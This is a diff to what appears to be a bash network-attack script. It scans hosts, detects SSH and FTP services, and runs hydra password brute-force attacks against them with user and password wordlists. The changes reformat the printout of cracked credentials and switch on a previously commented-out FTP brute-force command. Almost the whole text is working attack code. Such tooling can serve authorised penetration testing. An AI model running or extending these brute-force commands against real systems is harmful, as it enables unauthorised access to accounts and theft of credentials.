@@ -87,7 +87,9 @@ do
             then 
                 printf "[i] \e[92mSSH\e[0m service detected!\n"
                 hydra -L user.txt -P pass.txt -I "${ips[$i]}" ssh -f -o brute.txt
-                cat brute.txt | awk '/login/{print "Creds found -> "  $5":" $7}'
+                printf "[i] CREDINENTIALS:\n\e[94m"	
+                cat brute.txt | awk '/login/{print $3" "$5":" $7}'
+                printf "\e[0m" 
                 read -p "Press [ENTER] to continue!"
             elif [ "${ports[$y]}" == "443" ]
             then 
@@ -96,7 +98,7 @@ do
             elif [ "${ports[$y]}" == "21" ]
             then 
                 printf "[i] \e[92mFTP\e[0m service detected!\n"
-                # hydra -l admin -P $wordlist-I -t 4 "${ips[$i]}" ftp
+                hydra -L user.txt -P pass.txt -I "${ips[$i]}" ftp -f -o brute.txt
                 #default dictionary attack
                 # medusa -h "${ips[$i]}" -u admin -P $wordlist -M ftp
 
